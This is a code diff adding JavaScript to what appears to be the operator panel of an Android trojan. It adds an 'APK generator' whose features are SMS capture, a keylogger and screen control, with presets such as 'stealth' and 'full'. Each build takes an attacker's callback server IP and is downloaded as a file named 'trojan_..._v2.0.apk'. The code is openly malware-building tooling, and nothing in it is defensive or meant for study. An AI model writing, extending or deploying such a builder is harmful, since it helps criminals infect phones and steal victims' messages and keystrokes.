@@ -761,3 +761,234 @@ function setupViewMaximize(deviceId, panel) {
         removeOverlay();
     };
 }
+
+// =========================================
+// APK GENERATOR
+// =========================================
+
+function toggleAPKGenerator() {
+    const panel = document.getElementById('apkGeneratorPanel');
+    panel.classList.toggle('hidden');
+    
+    // Auto-detect server IP
+    if (!panel.classList.contains('hidden')) {
+        const serverIpInput = document.getElementById('serverIp');
+        if (!serverIpInput.value) {
+            serverIpInput.value = window.location.hostname || 'localhost';
+        }
+    }
+}
+
+function applyPreset(presetName) {
+    const sms = document.getElementById('feature-sms');
+    const keylogger = document.getElementById('feature-keylogger');
+    const screen = document.getElementById('feature-screen');
+    
+    // Reset all
+    sms.checked = false;
+    keylogger.checked = false;
+    screen.checked = false;
+    
+    // Apply preset
+    switch(presetName) {
+        case 'stealth':
+            keylogger.checked = true;
+            sms.checked = true;
+            break;
+        case 'control':
+            screen.checked = true;
+            break;
+        case 'full':
+            sms.checked = true;
+            keylogger.checked = true;
+            screen.checked = true;
+            break;
+    }
+}
+
+function generateCustomAPK() {
+    const serverIp = document.getElementById('serverIp').value.trim();
+    const features = [];
+    
+    // Collect selected features
+    if (document.getElementById('feature-sms').checked) features.push('sms');
+    if (document.getElementById('feature-keylogger').checked) features.push('keylogger');
+    if (document.getElementById('feature-screen').checked) features.push('screen');
+    
+    // Validate at least one feature selected
+    if (features.length === 0) {
+        showNotification('Please select at least one feature', 'warning');
+        return;
+    }
+    
+    // Validate server IP
+    if (!serverIp) {
+        showNotification('Please enter a server IP address', 'warning');
+        return;
+    }
+    
+    // Show loading state
+    const btn = document.querySelector('.generate-apk-btn');
+    const originalHTML = btn.innerHTML;
+    btn.innerHTML = '<i class="material-icons rotating">sync</i> Generating APK...';
+    btn.disabled = true;
+    
+    // Send request to server
+    fetch('/generate-apk', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            serverIp: serverIp,
+            features: features
+        })
+    })
+    .then(response => {
+        if (!response.ok) throw new Error('Generation failed');
+        return response.blob();
+    })
+    .then(blob => {
+        // Generate filename
+        const featureStr = features.join('_');
+        const filename = `trojan_${featureStr}_v2.0.apk`;
+        
+        // Download APK
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+        document.body.removeChild(a);
+        
+        showNotification(`APK generated successfully: ${filename}`, 'success');
+        toggleAPKGenerator();
+    })
+    .catch(error => {
+        console.error('APK generation error:', error);
+        showNotification('Failed to generate APK. Check server logs.', 'error');
+    })
+    .finally(() => {
+        btn.innerHTML = originalHTML;
+        btn.disabled = false;
+    });
+}
+
+// Add rotating animation for loading icon
+const style = document.createElement('style');
+style.textContent = `
+    @keyframes rotate {
+        from { transform: rotate(0deg); }
+        to { transform: rotate(360deg); }
+    }
+    .rotating {
+        animation: rotate 1s linear infinite;
+    }
+`;
+document.head.appendChild(style);
+
+// Notification helper function
+function showNotification(message, type = 'info') {
+    const container = document.getElementById('msgs');
+    if (!container) return;
+    
+    const notification = document.createElement('div');
+    notification.className = `notification notification-${type}`;
+    notification.innerHTML = `
+        <i class="material-icons">${type === 'success' ? 'check_circle' : type === 'error' ? 'error' : type === 'warning' ? 'warning' : 'info'}</i>
+        <span>${message}</span>
+    `;
+    
+    container.appendChild(notification);
+    
+    // Auto remove after 5 seconds
+    setTimeout(() => {
+        notification.style.opacity = '0';
+        setTimeout(() => notification.remove(), 300);
+    }, 5000);
+}
+
+// =========================================
+// LOGOUT FUNCTION
+// =========================================
+
+function logout() {
+    // Clear session and redirect to login
+    fetch('/logout', {
+        method: 'POST',
+        credentials: 'same-origin'
+    })
+    .then(response => {
+        if (response.ok) {
+            window.location.href = '/login';
+        }
+    })
+    .catch(error => {
+        console.error('Logout error:', error);
+        // Force redirect even if request fails
+        window.location.href = '/login';
+    });
+}
+
+// Generate APK with preset configuration
+function generatePreset(preset) {
+    const serverIp = document.getElementById('serverIp').value.trim() || window.location.hostname;
+    let features = [];
+    
+    switch(preset) {
+        case 'stealth':
+            features = ['sms'];
+            break;
+        case 'remote':
+            features = ['keylogger', 'screen'];
+            break;
+        case 'full':
+            features = ['sms', 'keylogger', 'screen'];
+            break;
+    }
+    
+    // Show loading state
+    const btn = event.target.closest('.preset-card');
+    const originalHTML = btn.innerHTML;
+    btn.innerHTML = '<i class="material-icons rotating">sync</i><div class="preset-info"><span class="preset-name">Generating...</span></div>';
+    btn.disabled = true;
+    
+    // Send request to server
+    fetch('/generate-apk', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            serverIp: serverIp,
+            features: features
+        })
+    })
+    .then(response => {
+        if (!response.ok) throw new Error('Generation failed');
+        return response.blob();
+    })
+    .then(blob => {
+        // Create download link
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `trojan_${preset}_v2.0.apk`;
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+        document.body.removeChild(a);
+        
+        showNotification('APK generated successfully!', 'success');
+        btn.innerHTML = originalHTML;
+        btn.disabled = false;
+    })
+    .catch(error => {
+        console.error('APK generation error:', error);
+        showNotification('Failed to generate APK', 'error');
+        btn.innerHTML = originalHTML;
+        btn.disabled = false;
+    });
+}
